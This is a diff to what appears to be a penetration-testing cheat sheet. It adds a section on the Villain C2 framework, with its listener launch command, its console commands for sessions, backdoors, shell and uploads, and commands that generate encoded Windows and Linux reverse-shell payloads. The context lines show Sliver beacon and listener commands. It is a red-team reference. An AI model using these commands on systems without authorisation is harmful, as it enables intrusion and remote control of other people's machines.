@@ -11,6 +11,7 @@
 - [Merlin](#merlin)
 - [Mythic](#mythic)
 - [Sliver](#sliver)
+- [Villain](#villain)
 
 ## Resources
 
@@ -1072,4 +1073,42 @@ sliver > generate beacon --http <RHOST>:8443 --os windows --arch amd64 --format 
 
 ```c
 sliver > http --lport 8443
+```
+
+## Villain
+
+> https://github.com/t3l3machus/Villain
+
+```c
+$ python3 Villain.py -p 8001 -x 8002 -n 8003 -f 8004
+```
+
+### Common Commands
+
+```c
+Villain > help
+Villain > connect
+Villain > generate
+Villain > siblings
+Villain > sessions
+Villain > backdoors
+Villain > sockets
+Villain > shell
+Villain > exec
+Villain > upload
+Villain > alias
+Villain > reset
+Villain > kill
+Villain > id
+Villain > clear
+Villain > purge
+Villain > flee
+Villain > exit
+```
+
+### Generate Payloads
+
+```c
+Villain > generate payload=windows/netcat/powershell_reverse_tcp lhost=<INTERFACE> encode
+Villain > generate payload=linux/hoaxshell/sh_curl lhost=<INTERFACE> encode
 ```
